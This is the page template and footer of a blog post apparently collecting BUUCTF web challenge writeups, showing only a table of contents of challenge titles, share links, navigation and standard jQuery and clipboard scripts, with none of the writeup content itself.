+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup"><span class="toc-number">1.</span> <span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">2.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-tornado"><span class="toc-number">3.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#admin"><span class="toc-number">4.</span> <span class="toc-text">admin</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&text=BUUCTF web writeup 记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&is_video=false&description=BUUCTF web writeup 记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF web writeup 记录&body=Check out this article: https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&title=BUUCTF web writeup 记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&name=BUUCTF web writeup 记录&description=&lt;p&gt;BUUCTF web writeup 记录 不定期更新&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/09/12/BUUCFT writeup 记录/&t=BUUCTF web writeup 记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Six
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
